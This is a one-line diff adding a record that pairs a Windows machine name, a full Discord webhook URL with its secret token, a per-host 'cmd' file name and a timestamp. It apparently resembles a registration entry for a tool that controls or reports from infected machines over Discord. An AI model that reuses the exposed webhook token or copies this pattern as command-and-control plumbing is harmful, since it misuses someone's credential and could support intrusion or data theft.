@@ -1,0 +1,1 @@
+setup:DESKTOP-NTUNEJ8:https://discord.com/api/webhooks/1557497590436860044/ERMTFSwsdxzOHZw81RBJEzQ8EPB0h8Nq-qVi2nnd4EAXLTikEqjZHrUJHJlEPp3oC8Go;cmd-desktop-ntunej8.txt|1791406763
